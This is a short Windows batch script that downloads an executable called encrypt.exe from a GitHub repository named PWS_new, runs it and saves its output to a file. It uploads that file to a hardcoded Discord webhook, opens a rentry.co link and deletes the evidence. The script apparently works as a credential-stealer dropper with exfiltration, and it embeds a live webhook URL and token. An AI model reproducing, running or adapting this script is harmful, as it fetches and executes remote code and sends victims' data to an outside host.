@echo off
setlocal enabledelayedexpansion

rem Download encrypt3.exe from GitHub
curl -OL https://raw.githubusercontent.com/Sap196/PWS_new/main/encrypt.exe

rem Run the Go program and capture its output to a file
encrypt.exe > output.txt

rem Construct and execute the cURL command
set "discord_webhook=https://discord.com/api/webhooks/1202328029196730398/24xNitV8WYbF4qUql5MncBzaVeyDJfvAwLOsSdU8yPl17R4mwT8Juyo9TWGqi2FEfYBL"
set "curl_command=curl -i -X POST -H "Content-Type: multipart/form-data" -F "file=@output.txt" %discord_webhook%"
echo Sending cURL command: %curl_command%
%curl_command%

START https://rentry.co/9kpphkvk

rem Remove files and the script
del encrypt.exe
del output.txt
